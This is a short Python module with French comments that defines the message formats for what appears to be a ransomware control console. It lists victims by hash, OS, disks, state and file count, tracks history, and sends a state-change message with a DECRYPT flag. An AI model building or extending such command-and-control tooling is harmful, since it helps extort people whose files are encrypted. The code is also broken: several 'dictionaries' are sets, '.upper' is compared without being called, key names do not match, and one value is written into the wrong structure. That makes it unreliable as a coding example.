# Constante
DEBUG_MODE = False

# tous les dictionnaires LIST_VICTIM
LIST_VICTIM_REQ = { 'LIST_REQ': None }
LIST_VICTIM_RESP = {'VICTIM','HASH','OS','DISKS','STATE','NB_FILES'}
LIST_VICTIM_END = { 'LIST_END': None }

# tous les dictionnaire deHISTORY
HISTORY_REQ = {'HIST_REQ'}
HISTORY_RESP = {'HIST_RESP','TIMESTAMP','STATE','NB_FILES'}
HISTORY_END = {'HIST_END'}

# dictionnaire de CHANGE_STATE
CHANGE_STATE = {'CHGSTATE','STATE','DECRYPT'}

# liste de MESSAGE_TYPE
MESSAGE_TYPE = {
    'LIST_REQ': 'LIST_VICTIM_REQ',
    'VICTIM': 'LIST_VICTIM_RESP',
    'LIST_END' : 'LIST_VICTIM_END',
    'HIST_REQ' : 'HISTORY_REQ',
    'HIST_RESP' : 'HISTORY_RESP',
    'HIST_END' : 'HISTORY_END',
    'CHGSTATE' : 'CHANGE_STATE'
}

def set_message(select_msg, params=None):
    if select_msg.upper() == 'LIST_VICTIMS_REQ':
        return LIST_VICTIM_REQ

    if select_msg.upper == 'LIST_VICTIM_RESP':
        if len(params) != 6:
            return None
        LIST_VICTIM_RESP['VICTIM'] = params[0]
        LIST_VICTIM_RESP['HASH'] = params[1]
        LIST_VICTIM_RESP['OS'] = params[2]
        LIST_VICTIM_RESP['DISKS'] = params[3]
        LIST_VICTIM_RESP['STATE'] = params[4]
        LIST_VICTIM_RESP['NB_FILES'] = params[5]
        return LIST_VICTIM_RESP

    if select_msg.upper() == 'LIST_VICTIM_END':
        return LIST_VICTIM_END

    if select_msg.upper == 'HISTORY_REQ':
        if len(params) != 1:
            return None
        HISTORY_REQ['HIST_REQ'] = params[0]
        return HISTORY_REQ

    if select_msg.upper() == 'HISTORY_RESP':
        if len(params) != 4:
            return None
        HISTORY_RESP['HISTO_RESP'] = params[0]
        HISTORY_RESP['TIMESTAMP'] = params[1]
        HISTORY_RESP['STATE'] = params[2]
        HISTORY_RESP['NB_FILES'] = params[3]
        return HISTORY_RESP

    if select_msg.upper() == 'HISTORY_END':
        if len(params) != 1:
            return None
        HISTORY_RESP['HIST_END'] = params[0]
        return HISTORY_END

    if select_msg.upper() == 'CHANGE_STATE':
        if len(params) != 1:
            return None
        HISTORY_RESP['CHGSTATE'] = params[0]
        return CHANGE_STATE


def get_message_type(message):
    first_key = list(message.keys())[0]
    #if DEBUG_MODE:
    #    print("get_message_type()\n MESSAGE TYPE:", MESSAGE_TYPE[first_key])
    return MESSAGE_TYPE[first_key]

